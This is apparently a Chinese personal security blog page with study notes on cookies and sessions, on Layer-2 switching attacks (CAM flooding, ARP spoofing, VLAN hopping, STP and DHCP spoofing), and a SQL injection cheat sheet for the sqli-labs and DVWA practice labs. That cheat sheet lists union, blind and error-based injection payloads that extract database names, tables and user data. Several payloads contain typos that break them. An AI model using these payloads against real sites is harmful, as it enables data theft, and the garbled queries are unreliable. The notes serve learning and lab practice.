<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="Cookie-简介"><a href="#Cookie-简介" class="headerlink" title="Cookie 简介"></a>Cookie 简介</h2><p>Cookie 是一种让网站服务器能把少量文本数据存到客户端硬盘、内存，或者是从客户端的硬盘、内存读取数据的一种技术。</p>
<p>因为 HTTP 协议是无状态的，Web 服务器无法区分一个请求是否来自同一个浏览器。所以，Web 服务器需要额外的数据用于维护会话。Cookie 正式一段随 HTTP 请求、响应一起被传递的额外数据，它的作用就是<strong>标识用户、维持会话</strong>。</p>
<p>当你访问某个网站时，该网站可能向你的电脑写入一个非常小的文本文件，他可以记录你用户的 ID、密码、停留的时间等信息，这个文件就是 Cookie 文件。当你再次访问这个网站时，浏览器会自动检测你的硬盘，并将存储在本地的 Cookie 发送给网站，网站通过读取 Cookie，得到你的相关信息，就可以做出相应的动作。</p>
<p>Cookie 按照在硬盘中存储的位置，可以分为<strong>内存 Cookie</strong> 和 <strong>硬盘 Cookie</strong>。内存 Cookie 由浏览器维护，保存在内存中，浏览器关闭后就消失，其存在时间是短暂的。硬盘 Cookie 保存在硬盘中，有一个过期时间，除非用户手动清理，或者到了过期时间，否则硬盘 Cookie 是不会被删除的，其存在时间是长期的。所以，Cookie 也可以分为<strong>持久 Cookie</strong> 和<strong>非持久 Cookie</strong>。</p>
<p>一个用户电脑里也可以有多个 Cookie 存在，分别保存不同网站的存储信息，但是一个网站只能存取自己的 Cookie 信息，无法读取电脑上的其他 Cookie 信息。</p>
<h2 id="Cookie-格式"><a href="#Cookie-格式" class="headerlink" title="Cookie 格式"></a>Cookie 格式</h2><p>每个 Cookie 文件都是一个 TXT 文件，都以 “<strong>用户名@网站 URL</strong>“ 来命名。</p>
<p>Cookie 部分格式如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: <span class="tag">&lt;<span class="name">name</span>&gt;</span>=<span class="tag">&lt;<span class="name">value</span>&gt;</span>[;<span class="tag">&lt;<span class="name">Max-Age</span>&gt;</span>=<span class="tag">&lt;<span class="name">age</span>&gt;</span>][;expires=<span class="tag">&lt;<span class="name">date</span>&gt;</span>][;domain=<span class="tag">&lt;<span class="name">domain_name</span>&gt;</span>][;path=<span class="tag">&lt;<span class="name">some_path</span>&gt;</span>][;secure][;HttpOnly]</span><br></pre></td></tr></table></figure>

<ul>
<li>Set-Cookie : HTTP 响应头，Web 服务器通过此 HTTP 头向客户端发送 Cookie</li>
<li>name=value : 每一个 Cookie 必须含有的部分。用户可以根据 name 取出存在 Cookie 中的 value。name=value 中不含有分号、逗号、空格。</li>
<li>expirse=date : Expires 确定了 Cookie 的有效终止日期。该变量是可选的，如果缺省，则 Cookie 的值不会保存在硬盘中，而仅仅保存在内存中。</li>
<li>domain=domain_name : Domain 变量确定了哪些 Internet 域中的服务器可以读取浏览器的存储的 Cookie。该设置是可选的，如果缺省，值为该 Web 服务器的域名。</li>
<li>path=path : 定义了 Web 服务器上哪些路径下的页面可以获取服务器发送的 Cookie。该设置是可选的，如果缺省，值为该 Web 服务器传给浏览器的资源路径名。</li>
<li>secure : 如果在 Cookie 中标记该变量，表明和服务器之间的通信协议为加密认证协议时，才会发送 Cookie，目前只有 HTTPS。</li>
<li>HttpOnly : 禁止 Javascript 读取 Cookie。</li>
</ul>
<h1 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION"></a>SESSION</h1><p>除了 Cookie 之外，SESSION 是另外一种维持会话访问状态的机制。只不过 SESSION 是服务端的机制，SESSION 与 Cookie 的区别就是，SESSION 保存在服务端，Cookie 保存在客户端。</p>
<p>Web 中的 SESSION 是指从打开一个网站到关闭浏览器的过程，也就是客户端与服务端一次”对话”，被称为 SESSION，当浏览器关闭时，SESSION 也自动注销。</p>
<p>每个用户的会话状态都是不同的 SESSION，管理员登陆网站时，这是一个 SESSION，普通用户登陆网站时，这又是一个 SESSION。而服务器依靠 SESSIONID 来区分不同的 SESSION。</p>
<p>当用户第一次连接到服务器时，会分配一个 SESSIONID，这个 SESSIONID 是唯一的，且不会重复，当服务器或浏览器关闭时，SESSION 将自动注销，用户重新连接时会重新分配。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/13/二层交换中的攻击/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/13/二层交换中的攻击/" itemprop="url">二层交换中的攻击</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-13T00:23:24+08:00">
                2019-06-13
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前导篇"><a href="#前导篇" class="headerlink" title="前导篇"></a>前导篇</h1><h2 id="以太网和以太网帧"><a href="#以太网和以太网帧" class="headerlink" title="以太网和以太网帧"></a>以太网和以太网帧</h2><h3 id="OSI-模型"><a href="#OSI-模型" class="headerlink" title="OSI 模型"></a>OSI 模型</h3><ul>
<li>其核心思想为<strong>分层</strong>，每一个模块只负责自己特定的功能</li>
<li>不同模块之间定义标准化接口，实现每层的相互独立</li>
<li>下层将收到的数据格式化成上层所能识别的格式，同时也能通过变换，将数据传给下层</li>
</ul>
<h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><ul>
<li>在局域网中应用最广泛的网络技术</li>
<li>使用 CSMA/CD 解决冲突问题</li>
</ul>
<h3 id="以太网帧"><a href="#以太网帧" class="headerlink" title="以太网帧"></a>以太网帧</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/6.png" alt></p>
<ul>
<li>前导码(7 字节)：唤醒接收适配器(例如网卡)，并将他们的时钟与发送方同步</li>
<li>帧首定界符(1 字节)：注明下一字节为目的 MAC 地址</li>
<li>目的 MAC 地址(6 字节)：目的适配器的 MAC 地址</li>
<li>源 MAC 地址(6 字节)：发送方目的地址</li>
<li>协议类型(2 字节：实现协议的多路复用，用于标识协议类型，例如 IP 协议 (0x0800)，ARP 协议 (0x0808)，更多协议 <a href="https://www.cnblogs.com/code1992/p/9829198.html" target="_blank" rel="noopener">点击此处</a></li>
<li>数据：承载 IP 数据报</li>
<li>数据帧检验序列(4 字节)：差错检测机制</li>
</ul>
<h2 id="二层交换机转发原理"><a href="#二层交换机转发原理" class="headerlink" title="二层交换机转发原理"></a>二层交换机转发原理</h2><h3 id="转发原理"><a href="#转发原理" class="headerlink" title="转发原理"></a>转发原理</h3><ul>
<li>交换机接收到数据帧之后将它们转发出去，这个过程可以分为过滤和转发两个部分。</li>
<li>过滤功能就是交换机判断一个数据帧应转发到某个端口还是丢弃。</li>
<li>转发功能就是交换机进行帧过滤后，决定一个数据帧应该到哪一个交换机端口。</li>
<li>交换机按照数据帧中的目的 MAC 地址作为索引，通过对交换机内部的 CAM 表进行查询来实现转发。</li>
</ul>
<h3 id="CAM-表"><a href="#CAM-表" class="headerlink" title="CAM 表"></a>CAM 表</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/35.png" alt></p>
<ul>
<li>交换机通过对收到的数据帧中的源 MAC 地址进行学习构造 CAM 表</li>
<li>转发与自学习算法<ol>
<li>交换机从端口接收数据帧，暂存到缓存中</li>
<li>自学习：截取数据帧中的源 MAC 地址，与 CAM 表中的 MAC 地址匹配<ul>
<li>找到匹配地址，对应端口号相同，更新时间戳</li>
<li>找到匹配地址，对应端口号不同，更改对应端口号并更新时间戳</li>
<li>未找到匹配地址，将数据帧中的源 MAC 地址，来自交换机的端口，以及时间戳添加到 CAM 表中</li>
<li>如果某个 MAC 地址在周期时间内未更新，则删除</li>
</ul>
</li>
<li>转发：截取数据帧中的目的 MAC 地址，与 CAM 表中的 MAC 地址匹配<ul>
<li>找到匹配地址，则获取对应端口号，然后将数据帧转发到对应端口号</li>
<li>未找到匹配地址，则将数据帧进行广播处理，转发到交换机的所有端口</li>
</ul>
</li>
<li>结束</li>
</ol>
</li>
</ul>
<blockquote>
<p>MAC 表和 CAM 表所其作用的环境不同，MAC 表是全局表，一般通过全局 CPU 进程转发需要查看 MAC 表，但是，现在基本都是硬件快速转发，那么这个时候就生成了CAM表，它其实是从MAC表衍生出来的，每个接口都可以有CAM以便快速转发。简而言之，CAM 从 MAC 转变而来，并用于基于硬件的快速转发 </p>
</blockquote>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
<li>若 CAM 表被恶意快速填满，则会导致以后转发的数据帧变为广播帧，从而被嗅探监听</li>
<li>若 CAM 表被恶意快速填满，可能导致某些主机转发数据帧被误导，则导致中间人攻击而不能通信</li>
</ol>
<h2 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a>生成树协议</h2><h3 id="生成树协议的产生"><a href="#生成树协议的产生" class="headerlink" title="生成树协议的产生"></a>生成树协议的产生</h3><ul>
<li>为了使某一个网络链路出了故障而不影响整个网络，人们引入冗余链路技术</li>
<li>只要有冗余链路的地方，就会出现环路问题，生成树协议在一定程度上解决了这个问题</li>
</ul>
<h3 id="生成树协议的过程"><a href="#生成树协议的过程" class="headerlink" title="生成树协议的过程"></a>生成树协议的过程</h3><ol>
<li>局域网交换机间互相发送 BPDU 消息进行根网桥的选举，根网桥上的接口都是指定端口</li>
<li>然后在不是根网桥的交换机上选出一个根端口</li>
<li>在交换机和交换机相连的链路上，要选举出一个端口作为指定端口，负责将数据帧转发到根网桥上</li>
<li>有了根端口和指定端口后，其他的端口就是非指定端口，也是最终被阻断的端口，这样就防止了环路</li>
</ol>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/36.jpg" alt></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
<li>生成树协议完全依赖 BPDU 数据帧信息，缺少认证机制，如果攻击者伪造优先级为 0 的 BPDU 消息，就会使局域网中的交换机将所有分组转发到攻击者的交换机。</li>
<li>在局域网中发送大量伪造的 BPDU 导致交换机忙于处理 BPDU 消息，从而使交换机处于拒绝服务状态，最终通信中断</li>
</ol>
<h2 id="DHCP-协议"><a href="#DHCP-协议" class="headerlink" title="DHCP 协议"></a>DHCP 协议</h2><h3 id="DHCP-工作过程"><a href="#DHCP-工作过程" class="headerlink" title="DHCP 工作过程"></a>DHCP 工作过程</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/29.png" alt></p>
<ol>
<li><p>DHCP Discover：新机器刚刚接入网络，什么都没有。新来的机器使用 IP 地址 0.0.0.0 发送一个广播包，广播包封装了 UDP，UDP 封装了 BOOTP。如果网络中存在 DHCP Server，它在收到广播包之后就知道来了个新人，需要 IP 地址，就会返回一个租用信息</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/37.jpg" alt></p>
</li>
<li><p>DHCP Offer：通过单播返回的租用信息，包含已分配的 IP 地址</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/38.jpg" alt></p>
</li>
<li><p>DHCP Request：广播包，向 DHCP Server 确认 IP 地址没有问题，并告诉其他的 DHCP Server 自己使用的是哪个 DHCP Server 的租约，请求它们撤销提供的 IP。一般使用最先到达的 DHCP Offer</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/39.jpg" alt></p>
</li>
<li><p>DHCP ACK：通过广播表明接收客户机的选择，并将租约信息放在广播包中</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/40.jpg" alt></p>
</li>
</ol>
<blockquote>
<p>DHCP 服务器的 offer 与 ack 阶段既可以使用单播的方式又可以使用广播的方式，这主要取决于服务器在 offer 阶段对 BROADCAST 位的置位情况,如果置位为 1，则 DHCP 服务器使用广播的方式回应，否则使用单播的方式回应</p>
</blockquote>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在客户端上伪造大量源 MAC 地址，然后将含有这些伪造的源 MAC 地址的 DHCP 发现包发送出去，由于 DHCP Server 没有识别能力，就会处理这些 Discover，直至资源被耗尽。此时，攻击者伪造一个 DHCP Server，给局域网的机器发送伪造的配置信息，从而向客户端发起其他攻击</p>
<h1 id="针对二层交换的攻击"><a href="#针对二层交换的攻击" class="headerlink" title="针对二层交换的攻击"></a>针对二层交换的攻击</h1><h2 id="交换机毒化"><a href="#交换机毒化" class="headerlink" title="交换机毒化"></a>交换机毒化</h2><ul>
<li>到达交换机的数据帧交给交换机，通过查询 CAM 表进行地址端口核对，如果找到数据帧中的目的 MAC 地址对应的端口则转发，否则交换机就会将数据帧以广播帧形式转发到所有端口</li>
<li>攻击者使用大量的无效源 MAC 地址、目的 MAC 地址构造虚假的数据帧，向局域网发送，交换机的 CAM 表会被迅速填满。交换机无法处理更多的帧，这时攻击者可以进行嗅探监听</li>
</ul>
<h2 id="MAC-地址欺骗"><a href="#MAC-地址欺骗" class="headerlink" title="MAC 地址欺骗"></a>MAC 地址欺骗</h2><ul>
<li>利用虚假的或攻击者指定的 MAC 地址伪装成网络中其他主机或设备</li>
<li>交换机发现两个端口对应同一个 MAC 地址而导致混乱，攻击者通过这种方式强制交换机将发送给合法主机的数据帧发送给攻击者</li>
</ul>
<h2 id="ARP-欺骗"><a href="#ARP-欺骗" class="headerlink" title="ARP 欺骗"></a>ARP 欺骗</h2><ul>
<li>攻击者将源 MAC 地址伪装成网络上其他主机的攻击方式。攻击者通过对 ARP 表毒化而进行欺骗</li>
<li>例如某一 IP 地址是 192.168.0.254，其 MAC 地址为 00-11-22-33-44-55，交换机 ARP 表会有这一条 ARP 记录。攻击者发动攻击时，会大量发出已将 192.168.0.254 的 MAC 地址篡改为 00-55-44-33-22-11 的 ARP 数据包。那么交换机若将此伪造的 ARP 写入自身的 ARP 表后，其他计算机与 192.168.0.254 通信时，数据包将被导到 00-55-44-33-22-11 这个MAC地址，因此攻击者可从此MAC地址截收到数据包，可篡改后再转送(中间人攻击)，也可转送到真正的网关(数据包嗅探监听)</li>
</ul>
<h2 id="VLAN-跳转攻击"><a href="#VLAN-跳转攻击" class="headerlink" title="VLAN 跳转攻击"></a>VLAN 跳转攻击</h2><ul>
<li>在正常情况下，不同 VLAN 间的通信，需要利用一个三层设备在不同 VLAN 间进行数据传输</li>
<li>VLAN 跳转攻击是指攻击者企图绕过三层设备，直接从一个 VLAN 向另一个 VLAN 建立通信，并对另一个 VLAN 的设备进行入侵</li>
</ul>
<h2 id="STP-协议攻击"><a href="#STP-协议攻击" class="headerlink" title="STP 协议攻击"></a>STP 协议攻击</h2><ul>
<li>攻击者通过广播伪造的 BPDU 来夺取根网桥的身份</li>
</ul>
<h2 id="DHCP-欺骗与耗尽"><a href="#DHCP-欺骗与耗尽" class="headerlink" title="DHCP 欺骗与耗尽"></a>DHCP 欺骗与耗尽</h2><ul>
<li>攻击者通过泛洪大量伪造的 DHCP Discover，来使 DHCP Server 资源耗尽，从而使局域网中的合法客户端无法联网</li>
<li>攻击者伪造 DHCP Server，给局域网的机器发送伪造的配置信息，从而向客户端发起其他攻击</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/10/SQL注入总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/10/SQL注入总结/" itemprop="url">SQL 注入</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-10T09:58:16+08:00">
                2019-06-10
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><h2 id="sqli-labs和dvwa"><a href="#sqli-labs和dvwa" class="headerlink" title="sqli-labs和dvwa"></a>sqli-labs和dvwa</h2><p>在用火狐时发现一个问题，在浏览器的URL栏输入 # 时，会把 # 后面的都注释掉，比如，127.0.0.1/index.php?id=1#qwerasdf，通过抓包发现请求的是127.0.0.1/index.php?id=1</p>
<p>由此得到结论，# 对于浏览器就是注释的意思。这也就解释了sqli-labs中在有些关卡在URL中输入 # 无效但是 %23 有效的状况</p>
<p>同样的在 Less-25 中，过滤了 and 和 or ，如果直接使用 &amp;&amp; ，是会报错的，应用 %26%26</p>
<p>在 dvwa 的注入中，在提交 id 时会对提交内容进行一次 URLencode，所以在那个框框里面输入 1’ %23 是无法起到注释作用的，通过抓包发现其请求的是 ?id=1’%2523，其中 %25 是 % 的URL编码。在sqli-labs的 POST 注入中也会出现上述情况。</p>
<h2 id="一些闭合方式"><a href="#一些闭合方式" class="headerlink" title="一些闭合方式"></a>一些闭合方式</h2><p>‘$id’，”$id”，(‘$id’)，(“$id”)，{“$id”}，{‘$id’}</p>
<h1 id="GET型注入"><a href="#GET型注入" class="headerlink" title="GET型注入"></a>GET型注入</h1><h2 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h2><p>字符型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">//报错信息 &apos;1&apos;&apos; LIMIT 0,1 </span><br><span class="line">//有三个 &apos; ，猜 MySQL 语句 select * from table where id=&apos;$id&apos; </span><br><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 </span><br><span class="line">?id=1&apos;%23	 //返回正常</span><br></pre></td></tr></table></figure>

<p>数字型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">//报错信息 &apos; LIMIT 0,1 </span><br><span class="line">//有一个 &apos; ，猜 MySQL 语句 select * from table where id=$id </span><br><span class="line">near &apos;&apos; LIMIT 0,1&apos; at line 1 </span><br><span class="line">?id=1+1	 //返回正常</span><br></pre></td></tr></table></figure>

<h2 id="判断查询字段数"><a href="#判断查询字段数" class="headerlink" title="判断查询字段数"></a>判断查询字段数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union slect 1,2,3 %23  </span><br><span class="line">?id=1&apos; order by 3 %23  </span><br><span class="line">//返回正确，说明MySQL为select column1,column2,column3 from table where id=&apos;$id&apos;</span><br></pre></td></tr></table></figure>

<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//当前数据库 </span><br><span class="line">?id=1&apos; uinon select databse(),2,3 %23 </span><br><span class="line">//所有数据库 </span><br><span class="line">?id=1&apos; union select 1,select schema_name from INFORMATION_SCHEMA.schemata,3 %23</span><br></pre></td></tr></table></figure>

<h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select table_name from information_schema.tables where table_schema=&apos;xxx&apos;,3 %23</span><br></pre></td></tr></table></figure>

<h2 id="数据列"><a href="#数据列" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select column_name from information_schema.columns where table_name=&apos;xxx&apos;,3 %23</span><br></pre></td></tr></table></figure>

<h2 id="数据内容"><a href="#数据内容" class="headerlink" title="数据内容"></a>数据内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select xxx from xxx,3 %23</span><br></pre></td></tr></table></figure>

<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>一般布尔盲注中只会出现返回成功和返回失败的界面，不会有union联合查询的。</p>
<p>盲注分为布尔型，时间型和报错型。</p>
<p>首先判断注入类型，和以前相同，要注意二分法的应用。</p>
<h2 id="数据库名称长度"><a href="#数据库名称长度" class="headerlink" title="数据库名称长度"></a>数据库名称长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//用二分法判断范围 </span><br><span class="line">?id=1&apos; and length(database())=8 %23  //返回正确，说明数据库名称长度为8</span><br></pre></td></tr></table></figure>

<h2 id="数据库名称内容"><a href="#数据库名称内容" class="headerlink" title="数据库名称内容"></a>数据库名称内容</h2><p><strong>left判断</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and left(database(),1)=&apos;s&apos; %23 ?id=1&apos; and left(database(),2)=&apos;se&apos; %23 ?id=1&apos; and left(database(),8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure>

<p><strong>substr判断</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=83 %23 ?id=1&apos; and ascii(substr(database(),2,1))=69 %23 ?id=1&apos; and substr(database(),1,8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure>

<p><strong>regexp判断</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(database() regexp &apos;^[a-z]&apos;) %23 ?id=1&apos; and 1=(database() regexp &apos;^s[a-z]&apos;) %23 ?id=1&apos; and 1=(database()=&apos;security&apos;) %23</span><br></pre></td></tr></table></figure>

<p><strong>mid判断</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ord(mid(database(),1,1))=83 %23 ?id=1&apos; and ord(mid(database(),2,1))=69 %23 ?id=1&apos; and mid(database(),1,8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure>

<h2 id="数据表-1"><a href="#数据表-1" class="headerlink" title="数据表"></a>数据表</h2><p>先用length()判断长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=5 %23</span><br></pre></td></tr></table></figure>

<p>然后判断内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//left判断前两位 </span><br><span class="line">?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;e&apos; %23 ?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&apos;em&apos; %23 </span><br><span class="line">//substr判断第三位 </span><br><span class="line">?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)=&apos;a&apos; %23 </span><br><span class="line">//regexp判断第四位 </span><br><span class="line">?id=1&apos; and 1=(select 1 from information_schema.tables where table_schema=database() and table_name regexp &apos;^emai[a-z]&apos; limit 0,1) %23 </span><br><span class="line">//mid判断第五位 </span><br><span class="line">?id=1&apos; and mid((seanlect table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)=&apos;l&apos; %23</span><br></pre></td></tr></table></figure>

<p>如果想判断第二个表，把 limit 0,1 改为 limit 1,1 即可</p>
<p>但是regexp中不可以，只要是table_name中的内容，regexp都可以匹配到</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png" alt="img"></p>
<h2 id="数据列-1"><a href="#数据列-1" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure>

<p>改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&apos;xxxx&apos; limit 0,1</span><br></pre></td></tr></table></figure>

<p>再进行判断</p>
<h2 id="数据内容-1"><a href="#数据内容-1" class="headerlink" title="数据内容"></a>数据内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//ifnull和cast函数，第一位为D </span><br><span class="line">?id=1&apos; and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68 %23 </span><br><span class="line">//普通方式，第二位为u </span><br><span class="line">?id=1&apos; and ascii(substr((select username from security.users order by id limit 0,1),2,1))=85 %23</span><br></pre></td></tr></table></figure>

<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>使用报错注入的前提是，当前页面能够 print_r(mysql_error()) 或者是 echo(mysql_error())</p>
<p>后面 from 的表必须是存在的，比如 information_schema.tables 或者 information_schema.columns </p>
<h2 id="Floor报错"><a href="#Floor报错" class="headerlink" title="Floor报错"></a>Floor报错</h2><p>这两种语句都可以，只是第一个知道字段数是3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//替换 select user() </span><br><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23 </span><br><span class="line">//替换 select schema_name frominformation_schema.schemata limit 0,1 </span><br><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(((select schema_name frominformation_schema.schemata limit 0,1)),&apos;;&apos;,floor (rand(0)*2))x frominformation_schema.tables group by x)a) %23</span><br></pre></td></tr></table></figure>

<p>简化版Floor报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure>

<p>如果关键的表被禁用了，可以使用这种形式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure>

<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg" alt="img"></p>
<p>如果 rand 被禁用了可以使用用户变量来报错(实测未成功)</p>
